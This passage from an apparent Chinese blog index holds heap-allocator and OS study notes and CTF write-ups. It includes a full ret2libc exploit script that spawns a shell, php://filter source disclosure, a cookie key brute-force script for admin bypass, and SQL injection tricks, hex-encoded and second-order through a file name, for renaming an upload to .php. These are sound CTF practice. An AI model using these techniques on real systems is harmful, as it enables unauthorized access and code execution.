&quot;简单的题目。&quot;","path":"2018/10/27/heap_unlink/","date":"10-27","excerpt":""},{"title":"堆笔记1","text":"1. 什么是 chunk由 malloc 申请的内存称为 chunk 2. chunk 结构123456789101112struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize chunk 字段解释 prev_size ： 如果前一个chunk空闲，则该字段表示前一个chunk的大小。如果前一个chunk 非空闲状态，则此处作为前一个 chunk 的数据部分（即被前一个chunk使用）。 size ： 记录当前块的大小，必须为 2 * SIZE_T 的整数倍（SIZE_T 在32位为4，64位为8）该字段的低三位和大小没关系，分别为： 1. NON_MAIN_ARENA 记录该 chunk 是否属于主线程 2. IS_MAPPED 记录当前 chunk 是否由 mmap 分配 3. PREV_INUSE 记录前一个 chunk 是否被分配（第一个被分配的 chunk 的 P位都会设置成 1，防止访问前面的非法内存）。当该位为 0 时，可以用 prev_size 字段获得上个 chunk 的大小和地址。也方便空闲块的合并 fd： 如果该 chunk 被分配，从此处开始就是用户的数据，否则指向上一个空闲 chunkbk： 指向上一个空闲的 chunk fd_nextsize： 指向前一个与当前 chunk 大小不同的空闲块bk_nextsize： 指向后一个与当前 chunk 大小不同的空闲块 3. bins 什么是 bins 用户释放掉的 chunk 不会立马归还给系统，而是程序保留管理着，这样下次再分配时无需系统调用，节省资源。 ptmalloc 将 chunk 分为四类：1234fast binsunsorted binssmall binslarge bins 对于后三个 bins，ptmalloc 将他们分在同一个数组中，结构如下：123#define NBINS 128/* Normal bins packed as described above */mchunkptr bins[ NBINS * 2 - 2 ]; 数组中的 bins 顺序如下：1231. 数组第一个为 unsorted bin ，没有排序，内部 chunk 比较杂2. 数组中第 2 到 63 个为 small bin ， 同一个 small bin 链中的大小相同，两个相邻的 small bin 链中的大小相差字节数为 2*机器字长（即 32 位相差8 ，64位相差 16）3. 后面的为 large bins，chunk 的 fd 按从大到小排序。 当然还有上面提到的 fast bins，ptmalloc 为了提高分配速度，会把一些小的 bins 分配到 fast bins 中，fast bins 中的每个 P 位（chunk 的使用标记）都被设置为 1，所以不会被合并起来。 4. bins 们4.1 fast bin为了提高分配效率而设计的 fast bin 将存储一些较小的内存块，它们的 使用位永远被置为 1，所以不会被合并起来。 看两个宏：12345678910#ifndef DEFAULT_MXFAST#define DEFAULT_MXFAST (64 * SIZE_SZ / 4)#endif#define MAX_FAST_SIZE (80 * SIZE_SZ / 4)#define set_max_fast(s) \\ global_max_fast = \\ (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))#define get_max_fast() global_max_fast ptmalloc 首先会调用 set_max_fast 并把 DEFAULT_MXFAST 传进去，也就是设置 fast bins 中 chunk 的最大值。 MAX_FAST_SIZE 为 0 时，系统就不会支持 fastbin 。 当申请空间一个小于或等于 global_max_fast 时，ptmalloc 首先会在 fast bin 查询是否有合适大小的块。 再来看个东西：12#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL) 当释放的 chunk 与该 chunk 相邻的空闲 chunk 合并后大于 FASTBIN_CONSOLIDATION_THRESHOLD，表明内存碎片比较多了，我们就需要把 fast bins 中的 chunk 都进行合并。 malloc_consolidate 函数可以释放后所有 fastbins 并且将他们和其他的 空闲块 合并。 4.2 small binsmall bins 有 62 个双向链表，每个链表存储的大小都一致。 small bins 中每个链表的大小都有规律，即：chunk_size = 2SIZE_INDEXindex，例如在 32 位系统下下标为 2 的链表的大小为 242 = 16 个字节。 当然，fast bin 中的 chunk 是有可能会被放到 small bin 中去的，因为他们确实有些重合了。 4.3 large bin large bins 共有 63个 bin，每个 bin 中的大小不一致，但有个差值。 每个 bin 中的 chunk 大小之间公差一致。 第一个 large bin 的起始 chunk 大小为 512 字节，该组公差为 64B，所以该组可以存储 chunk 的大小范围为： [512,512+64) 4.4 unsorted bin 乱序的 bins 放进 unsorted bin 的 chunk 来自： 分割完大块后剩余部分，并且该部分要大于 MINSIZE 释放不属于 fast bin 的 chunk 并且 该 chunk 不和 top chunk 紧邻。 4.5 top chunk 简单理解就是在地址最高的一个 chunk，不属于任何 bins。 当程序需要分配的内存大小在 bins 中都不满足的情况下，尝试用 top chunk 给程序分配，如果够，则剩余部分继续做 top chunk，如果不够，则申请扩展内存后再分配。 当邻近 top chunk 的 chunk 被释放后，会合并到 top chunk 中 4.6 last remainder 当在 small chunk 找不到合适的块时，如果 last remainder chunk 大于要分配的内存，则分割这个 chunk 给用户并将剩余部分继续作为 last remainder chunk，该块好像是放在 unsorted bins 中的。","path":"2018/10/22/堆笔记1/","date":"10-22","excerpt":""},{"title":"程序员的自我修养-第一页","text":"1.2 万变不离其宗 讲了南桥北桥PCI 看不懂看不懂。 SMP 与多核 什么是 SMP：对称多处理器（Symmetrical Multi-Processing），就是多个 CPU 咯。什么是 多核：两个 CPU 你也买不起，所以良心的资本家们将 CPU 中的 缓存部件共享（据说是比较贵），把核心保留起来。即:多个核心+一个缓存部件 除非你想把 CPU 的每一滴油水都榨干，否则可以把多多核和 SMP 看成同一个概念 为什么不升级 CPU 本身而添加多核来提速呢？ 因为人们在制造 CPU 的工艺方面已经达到了物理极限，除非制造工艺有本质的突破。否则 4GHZ 就是 CPU 的天花板了。 1.3 站得高，望得远Any problem in computer science can be solved by another layer of indrection. 这节应该是强调了接口的概念： 接口？ 什么是接口？ 下层实现，上层使用。 比如类库中封装了 printf 函数。写代码的时候无需考虑 printf 用汇编的实现方式。所以 Windows 的 C 代码到了 Linux 依然可以编译，即使底层实现 printf 的方法不同（应该不同吧？） 什么是 硬件规格：驱动程序操作硬件的 接口，定义了如何与硬件通信 1.4 操作系统做什么1.41 别让 CPU 打盹 多道程序的出现 什么是多道程序呢： 聪明的程序员为了让 CPU 忙碌起来，写了个监控程序，当当前程序暂时无需使用 CPU 时（读写硬盘），监控程序就把 CPU 让给正在等待的程序。这就是多到程序。 多道程序的缺点： 没有优先级，所以有些很急的任务要等很久。想象一下如果点击一下鼠标，十分钟之后才等到 CPU 处理。。 进化成分时系统吧 什么是分时系统： 每个程序在运行一段时间后，程序 主动 让出 CPU 给其他程序。Windows早期版本（如 Windows 3.1 就是这种模式）。程序调用系统接口 Yield 、GetMessage、PeekMessage 时，Window3.1 会判断是否有其他程序正在等待 CPU ，如果有，就暂停当前程序，把 CPU 让给其他程序。 分时系统缺点： 但是，注意这是程序 主动 让出 CPU 啊。程序要是 while(1) 那你可咋办哟~ 多任务系统才是王道啊 什么是多任务系统： 操作系统接管了所有硬件资源并且本身运行在一个受硬件保护的级别。所有应用程序都以 进程 的方式运行在比操作系统权限更低的级别（作弊了呀）。 抢占式是什么： CPU 由操作系统分配。每个进程根据优先级都有机会得到 CPU。但如果运行超过一定时间，系统会暂停该进程，将 CPU 资源分配给其他正在等待的程序。 （这个模式是操作系统强制剥夺 CPU 资源啊~） 多任务的缺点： 书中没说他有缺点，那就当他没有缺点吧。 1.42 设备驱动 这一小节看的我想死，所以没有笔记 1.5 内存不够怎么办？早期程序是直接运行在物理内存的。 假设当前计算机物理空间有 128M ，程序A 需要 10M， 程序B 需要 100M，程序C 需要 20M，如果需要同时运行 A 和 B，那么可以很直接的将物理内存中 0-10M 分配给 A，10-110 分配给 B。 很明显会造成很多问题： 地址空间不隔离所有程序都直接访问物理内存，程序A 可以直接访问 程序B 的数据甚至代码。 使用效率低由于没有管理机制，所以如果现在要运行 C 的话。需要将其他程序暂时移到磁盘里去。但是程序需要连续的空间，所以移动 A 肯定是不够的，所以只能移 B。可以看到整个过程有大量的数据在换入换出，导致效率十分低下 运行的地址不确定每次分配的空间地址都不确定，但是数据和跳转时的目标地址都是固定的。这就涉及到重定向的问题了，会在以后讨论 1.51 关于隔离第一个问题就是隔离，怎么解决呢？ 聪明的程序员们建立了一个概念：虚拟地址空间。 虚拟地址空间：假的，不存在的。每个进程只能访问自己的地址空间，有效的做到了隔离物理地址空间：和名字一样，物理存在的。如果地址线有 32 条，那么物理空间就有 2^32 字节（4G）。但是如果你只装了 512 MB 的内存，那物理地址的有效部分为： 0x00000000 ~ 0x1FFFFFFF 1.52 分段分段的基本概念：说回上面的 程序 A 和 程序 B。假设有一个 地址从 0x0000000 到 0x00A00000 的 10M 虚拟空间。然后在物理地址中挑选一块相同大小的空间：0x00110000 到 0x00B10000，将这两块地址空间一一映射。（由软件映射，别问什么软件） 这里解决了上面提到的 第一个 和 第三个问题：两块没有重叠的空间，当 A 访问超出 0x00A0000 的时候，硬件就会判断这是个非法访问。 局部性原理 但是第二个问题还是没变啊，依然是每个整个程序的搬入搬出。聪明的程序员总是有解决办法，他们发现：当一个程序运行时，在某个时间段内，只是频繁的使用一小部分数据，也就是说很多数据一段时间内不会被访问到，这就是 tmd 局部性原理。 怎么利用起来了呢？程序员们给方法起了个名：分页。 1.53 分页分页的就是把地址空间人为的分成固定大小的页，页的大小由硬件决定，或者硬件支持多种大小的页，由操作系统选择。 加载一个程序时先将程序虚拟地址分页，然后将常用的页映射到物理内存，不常用的存在磁盘中（不同程序的有些虚拟页被映射到同一个物理页，实现内存共享）。 那要访问磁盘中的页时怎么办呢？此时硬件捕获到一个信息：页错误，然后阻塞该程序，将磁盘中的页换入内存中。 当然也要保护页啦，就好像上面提到的 两个程序用到同一个页时，这个页最好是不能被修改的，不然其中一个修改，另一个可能就读不到想要的数据/代码。每个页都可以设置权限属性，修改这些属性的权限也只有操作系统有。详细的介绍会放在日后。。。（不是我想放在日后） 虚拟内存的实现需要依靠硬件支持，对不同 CPU 来说是不同的，但是几乎所有的硬件都采用一个叫 MMU 的部件进行页映射，CPU 发出 虚拟地址 经过 MMU 转换成实际地址。 MMU 一般都集成在 CPU 内部。 1.6 众人拾材火焰高1.61 线程基础一个标准的线程有：线程ID，当前指令指针，寄存器集合和堆栈。","path":"2018/09/24/程序员的自我修养-第一页/","date":"09-24","excerpt":""},{"title":"一道简单的 PWN 题","text":"这道貌似是 ISG 2015 年的题了。。 本题WP 问题： 跟着栈溢出，将 EIP 覆盖成 write 函数的 plt 值，紧接着 read 的 plt 值，这里让我不解的是： 为什么 read 的函数被执行了。猜测应该是 write 函数中自带了 ret 指令。明天争取学会用 gdb 调试进 write 函数中吧。 接上。。尝试用 gdb 进入 write 函数。但是： 问了表哥后，表哥来了个姿势：先运行，在输入的时候按 CTRL+C （之前确实没学过 gdb ） 但是这里，可以整个更直接的：b write 运行&gt; 进入到 write 函数内，首先看看怎么取参数： 等会再讲。。 再看看最后，发现确实用的 ret（废话，不用 ret 怎么返回） 切入这道题。。。 思考 首先丢进 ida 里看看 很明显的一个缓冲区溢出。。（我也只会缓冲区溢出了） 这里写的 变量 v1 离 ebp 为 0xC(12) 个位置，但是实际测试为 0x10(16) 个位置。 这里玩个好玩的。。我们可以用 gdb_pattern 生成一些字符串，发送出去后查看 EIP。将此时的 EIP 记录下来再用 gdb_offset 查看偏移位置，这就是变量离 EIP 的位置了： 现在我们知道是离 20 个位置。我们可以先溢出玩玩，这里 checksec 发现开启了 NX 。我们可以先用 write 函数试试水。比如就打印 ida 代码中 第 6 行的 write(1, &quot;Welcome to ISG 2015!\\nPwn me to get the flag:\\n&quot;, 0x2Du); 在 ida 中看看 plt 的 write 地址： 再在 qira 中看看 welcome to isg.. 这段字符串在哪： 因为之前调用的 write 函数就是输出这段字符串，所以这个地址就是那段字符串的地址咯。。 整理一下： 初始栈的结构： 相对地址 对应值 0x0 变量 v1 0x4 … 0x8 … 0x12 … 0x16 ESP 0x20 EIP 所以这里填充 20 位任意字符。再用 write 函数的 plt 地址覆盖 EIP。 POC 如下： 看看 qira 中： 看到 write 函数执行了，但是我们没给参数，所以他取到了栈里的默认值，而中间的参数是最明显的，所以我们看看中间的参数位置是多少，方便覆盖。位置是：0xf6fff018 ，此时栈顶的地址： 0xf6fff008 。 回到一开始。。在 write 函数的截图中，发现取得参数位置分别是：esp+0x8, esp+0xC,esp+0x10。在取参数之前还有个 push 操作（在 write 函数中，上面的截图有。。），所以取参数得实际位置 +4。所以分别为： esp+0x8，esp+0x10,esp+14 。 再看个明显点的例子： 这里尝试控制参数。。 简单的加法：0x8+0x14 = 0x1C 函数调用 ok，别忘了一开始要做的事情，就是再调用一次 write 函数，输出一次 Welcome... 那个字符串。 找基地址 我们可以直接去 GOT 表找 write 函数的地址： 在 GOT 表中找到了 write 函数：0x804a01c。 改一下 ROP 链，将 write 的实际函数地址打印出来： 可以看到输出了正确的地址。代码中上面的 r.recv 是用来接收一开始输出的那段 welcome...，但是没必要输出（ 不接收的话下面 recv 还是会先接收到这个字符串 ）。 获取 system 地址和 /bin/sh 字符串 通过 ldd 看看这个 二进制 文件用了什么链接库.. 1234root@nick-machine:/home/nick/liey# ldd pwnme linux-gate.so.1 =&gt; (0xf77bc000) libc.so.6 =&gt; /lib32/libc.so.6 (0xf75f4000) /lib/ld-linux.so.2 (0x565e8000) /lib32/libc.so.6 中有我们想要的，首先是 获取 write 函数的偏移地址，这样就能获取到基地址了，可以用 readelf： 123root@nick-machine:/home/nick/liey# readelf -a /lib32/libc.so.6|grep write@ ..... 2303: 000d9900 119 FUNC WEAK DEFAULT 12 write@@GLIBC_2.0 记下来，偏移地址 0xd9900。 接下是 system 函数偏移地址： 123root@nick-machine:/home/nick/liey# readelf -a /lib32/libc.so.6|grep system@ ... 1443: 0003fe70 56 FUNC WEAK DEFAULT 12 system@@GLIBC_2.0 system 偏移地址是 0x3fe70。。接下来是 /bin/sh ，这个字符串用来传进 system 函数以便获取 shell，这里我们用 ROPgadget 1234root@nick-machine:/home/nick/liey# ROPgadget --binary /lib32/libc.so.6 --string &quot;/bin/sh&quot;Strings information============================================================0x0015da8c : /bin/sh 再发送 接下来思考一个问题，就是纵使在发送完一次 shellcode 只会知道了 基地址。但是我们却不能再调用了。。。 在最前面提到过。write 函数会调用 ret。可以把这个理解成 pop eip。也就是在栈顶中取出 eip。。。那么栈顶是哪呢？ 就是在 write 后以及所有参数的最前面。前面我用 0x61616161 替代了。。 但是又会遇到一个问题。。就是即使直接调用了 system 函数，函数内取参数是取的 esp+0x8，但是 esp+0x8 这个位置被 write 函数的 0xC 占用了。。 想一下是那个函数写进这段 shellcode 的。对，main 函数，我们可以调用会 main 函数，再调用一次 shellcode，只不过这次是调用 system 函数，而不是 write 函数。 (main 函数的位置再 ida 中可以找到) 完整的POC： 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *r = remote(&quot;192.168.1.107&quot;,4000)write_plt=0x08048370main=0x804847dprint(r.recv())poc_rop1=[ write_plt, main, 0x1, 0x804a01c, 4,]shellcode=&quot;a&quot;*20 + flat(poc_rop1)r.sendline(shellcode)write_offset = 0xd9900system_offset =0x3fe70bin_bash = 0x0015da8cbase = p32(int(r.recv().encode(&apos;hex&apos;),16)).encode(&apos;hex&apos;)base=int(base,16)-write_offsetsystem = base + system_offsetbin_str = base + bin_bashpoc_rop2 = [ system, 0x61626364, bin_str,]shellcode2 = &quot;a&quot;*12 + flat(poc_rop2)r.sendline(shellcode2)r.interactive() 需要注意的是第二次只需要填充 12 个 字符即可。。 效果： Done….","path":"2018/09/11/一道简单的 PWN 题/","date":"09-11","excerpt":""},{"title":"蓝鲸笔记管理系统（塔主nb）","text":"蓝鲸官网本题源码 首先先随便注册个，登陆看看： 这里看到个提示一样的东西：访问 /dbinit.sql 拿到 数据库结构。 再看看地址，首页的 url 地址为：http://106.39.10.134:10002/index.php?action=front&amp;mode=index 一开始还以为是 MVC 架构的，后来看了师傅的 WP 发现： 123456&lt;?php$action=$_GET['action'];$mode=$_GET['mode'];$file=$action.'/'.$mode.'.php';include($file);?&gt; 很明显的一个文件包含漏洞。用 php://filter 伪协议读取源码： /index.php?action=php://filter/read=convert.base64-encode/resource=front/&amp;mode=index 但是这里读不出 config.inc.php 原因可以在 index.php 中看到： 1else if(!preg_match(&apos;/\\.&#123;2&#125;/is&apos;,$_GET[&apos;action&apos;])&amp;&amp;preg_match(&apos;/^[0-9A-Za-z]+$/is&apos;,$_GET[&apos;mode&apos;]) mode 中不能包含 . 共读取到：123456789index.phpcommon.phpadmin/index.phpadmin/login.phpadmin/setpagenum.phpfront/index.phpfront/login.phpfront/newnote.phpfront/register.php 我们可以看看 admin/index.php 中是怎么验证是否登陆的（别问为什么一上来就看这个）： 调用了 check_login 和 get_level 函数，这两个函数在 common.php 中。我们先看看这个文件的开头： 很明显，这里进行了一些初始化操作。 再来看看两个验证函数： 这里将 cookie 中的 uid 取出，以 | 分割，加密判断。 如果成功返回当前 $_SESSION 中的值，否则返回 False。如果没登陆，那此时的值为 NULL ，但是判断使用的是 严格 判断，即： 1if(check_login()!==false&amp;&amp;get_level()!==false) 这两个函数的绕过方法是一样的，所以下一步我们的目标就是研究： $userinfo[1]==encode($userinfo[0]) 这个条件怎么成立，这个数组是我们可控的，我们可以跟进 encode 函数中： 123function encode($str)&#123; return md5($_SESSION['SECURITY_KEY'].$str);&#125; 不难理解，翻上面发现： 1$_SESSION[&apos;SECURITY_KEY&apos;]=rand_str(6); 来看看这个函数的实现：1234567891011function rand_str($lenth=16)&#123; $rand=[]; $_str=\"wh\"; while($lenth)&#123; $rand[]=$_str[rand(0,strlen($_str)-1)]; $lenth--; &#125;// var_dump($rand); return implode($rand);&#125; 随机取6位 w 或 h 整理一下思路： 要想绕过登陆验证，就要让验证函数返回 NULL。 函数返回 NULL 的条件为： 1if($userinfo[1]==encode($userinfo[0])) $userinfo 是我们可以控制的，唯一不确定的是 encode 函数中用到的 $_SESSION[&#39;SECURITY_KEY&#39;] 因为不对，所以我们写个脚本爆破： 1234567891011121314151617181920import requestsimport itertoolsfrom hashlib import md5lst = itertools.product(&quot;wh&quot;, repeat=6)url = &quot;http://106.39.10.134:10002/index.php?action=admin&amp;mode=index&quot;def m(s): return md5(s).hexdigest()for i in lst: key = m(&apos;&apos;.join(i) + &apos;admin&apos;) headers = &#123; &quot;Cookie&quot;: &quot;PHPSESSID=05ibpb1gtgmuq4ji4g5cgkvg07;uid=admin|&quot; + key &#125; r = requests.get(url, headers=headers) if r.text.find(&quot;not login&quot;) &lt; 0: print(headers) 很快就会输出 Cookie，添加上浏览器，再访问 后台的 index 即可。。 踩坑 这里还有个坑，就是如果你当前的 SESSION 已经登陆过前台，那么爆破就会失败。原因可能是 $_SESSION 中登陆的用户的 level 为 0，在 get_level 函数中会返回 False 现在我们已经登陆了后台，看看后台的代码： 这里拼接了个 get_page_size()，这个函数在 common.php 里，我们看看这个函数： 123456function get_page_size()&#123; $sql=&quot;select num from page&quot;; $res=mysql_my_query($sql); $row=$res-&gt;fetch_assoc(); return $row[&apos;num&apos;];&#125; 只做了很简单的查询。 我们会发现后台页面还有个设置页面（setpagenum.php），进去看看： 这个设置就是 get_page_size 查询并返回的表和字段，猜测关键点可能就在这了（别问为什么猜）。 可以看到，这里做了 is_numeric 的判断，判断是否是数字。 mysql 中允许这么玩：select 0x313233; 这条语句会输出 123，也就是 ASCII 码。 但是不允许这么玩： select &#39;0x313233&#39;; 注意这里加了单引号，此时输出 0x313133 我们发现这里是没有加引号的，所以我们传进来的值会在执行时解析成 ASCII 码。如果这是故意留的洞，那该字段的属性就不会是 int。因为 int 就不能存储字符串了。 回顾一下查询语句： 12$page_size=get_page_size();$sql=&quot;select * from note limit 0,&quot;.$page_size; 思考能不能用这样的语句：select * from note limit 0,1 union select 2 （！！！ 5.7 以后 limit 必须要放在最后，5.7以前是可以的） 5.7 以后会报：ERROR 1221 (HY000): Incorrect usage of UNION and LIMIT 利用 那么现在就可以利用了： 在 mysql 里运行： 这样我们就可以很方便的获得 16进制 了（只要转成 ASCII 就可以了）。 加上 0x 填上去提交： 到前台： 可以看到 3 和 2 被显示出来了。。看回一开始拿到的数据库结构，发现有个flags 表和 flag 字段，构造一下就可以出来了。。 突然的结束，是因为懒","path":"2018/09/09/蓝鲸笔记管理系统/","date":"09-09","excerpt":""},{"title":"蓝鲸文件管理系统（塔主nb）","text":"蓝鲸官网本题源码 题目描述： 1蓝鲸为了整理自己的工具，开发了一个文件管理系统，本来对系统的功能很满意，可是为什么总有人把蓝鲸的文件名修改了？蓝鲸找到了机智的你帮助它审计代码~ 这题一开始直接给了源码。 首先先看看上传的代码（uplaod.php）： 这里两个关键点： 121. 限制了文件的后缀名2. 插入进数据库 首先想想能不能这样： 这样是不行得。。因为在下面的拼接文件名的时候用的也是这个后缀：1$name = $path_parts[\"filename\"] . $path_parts[\"extension\"]; //此为上传的文件名 根据题目描述，我们看看 rename.php： 这里的 $req 在 common.inc.php 中是这么定义的： 12345foreach(array($_GET, $_POST, $_COOKIE) as $global_var) &#123; foreach($global_var as $key =&gt; $value) &#123; is_string($value) &amp;&amp; $req[$key] = addslashes($value); &#125;&#125; 类似自动解析了吧。 采坑 假设我们上传的文件名为：test.jpg 这无论如何都会在新文件名后加上 $result[&#39;extension&#39;] 在这里起初想绕过 rename ，即类似 move_uploaded_file 函数一样，传入 windows 文件名中不允许的字符，类似：newname.php.php;.jpg 或者 newname.php.php/.jpg(两个 .php 是因为在第22行会对$newname进行一次 basename操作) 但是貌似 rename 函数会报错（总之就是不行，原谅我看不懂内核代码） 放弃这个想法，看了师傅的 WP 后发现： 关键点在 23行的 update 语句： 1update `file` set `filename`=&apos;&#123;$req[&apos;newname&apos;]&#125;&apos;, `oldname`=&apos;&#123;$result[&apos;filename&apos;]&#125;&apos; where `fid`=&#123;$result[&apos;fid&apos;]&#125; $result 是在 第13行 根据传入的文件名查询出来的。 这里把 oldname 字段设置成了 $result[&#39;filename&#39;]。 这里的 $result[‘filename’] 我们是可控的，且没有做任何过滤。虽然传入的时候经过了 addslashes 的过滤（在 common.inc.php 中），但是查询出来后却没有过滤。 可控有什么用呢？前面分析过这里最大的问题在改的新名字会被强制加上 $result[&#39;extension&#39;]。但是这里是可以注入的，所以只要我们的文件名够骚，我们就能操作 update 语句，我们就可以将 extension 字段覆盖为空。 比如：&#39;,extension=&#39;&#39;,filename=&#39;test.jpg（最后要为 .jpg ） 此时数据库和文件夹里的情况： 此时去改名，传入文件名：&#39;,extension=&#39;&#39;,filename=&#39;test(去掉后缀)新文件名传入：test 此时的sql语句：1sql：update `file` set `filename`=&apos;test&apos;, `oldname`=&apos;&apos;,extension=&apos;&apos;,filename=&apos;test&apos; where `fid`=2 再看看： ok，成功踩坑。此时发现数据中的 filename 和 文件夹中的不同。下次 rename 的时候会找不到 test 文件（此时数据库中的 extension 已经为空） last我们把上传的文件名改改：&#39;,extension=&#39;&#39;,filename=&#39;test.jpg.jpg 此时的语句：1update `file` set `filename`=&apos;test&apos;, `oldname`=&apos;&apos;,extension=&apos;&apos;,filename=&apos;test.jpg&apos; where `fid`=3 会发现把 filename 设置成了 test.jpg 了，此时数据库与文件夹一致（不想截图了。。） 再改次名：12oldname：test.jpgnewname：test.php 即可。","path":"2018/09/09/蓝鲸文件管理系统/","date":"09-09","excerpt":""},{"title":"Nothing。。。","text":":)","path":"2018/09/09/hello-world/","date":"09-09","excerpt":""}]}